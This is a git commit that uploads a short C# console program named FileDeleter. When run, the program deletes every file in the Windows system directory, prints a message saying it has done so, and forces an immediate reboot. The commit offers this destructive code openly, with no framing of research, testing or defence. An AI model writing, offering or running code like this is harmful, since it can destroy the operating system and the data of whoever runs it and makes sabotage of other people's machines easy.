377f88c65103ee57b773387fb73f0756719796c4
Namida-Kitsune <90796502+Namida-Kitsune@users.noreply.github.com>
2022-12-16 18:28:49 +0700

    Add files via upload

---
+++ FileDeleter/FileDeleter/Program.cs
@@ -0,0 +1,30 @@
+﻿// Import the necessary namespaces
+using System;
+using System.IO;
+using System.Diagnostics;
+
+namespace FileDeleter
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // Get the path to the Windows directory
+            string windowsPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+
+            // Get all the files in the Windows directory
+            string[] files = Directory.GetFiles(windowsPath);
+
+            // Loop through each file and delete it
+            foreach (string file in files)
+            {
+                File.Delete(file);
+            }
+
+            Console.WriteLine("All files in the Windows directory have been deleted.");
+
+            // Reboot the system
+            Process.Start("shutdown", "/r /t 0");
+        }
+    }
+}
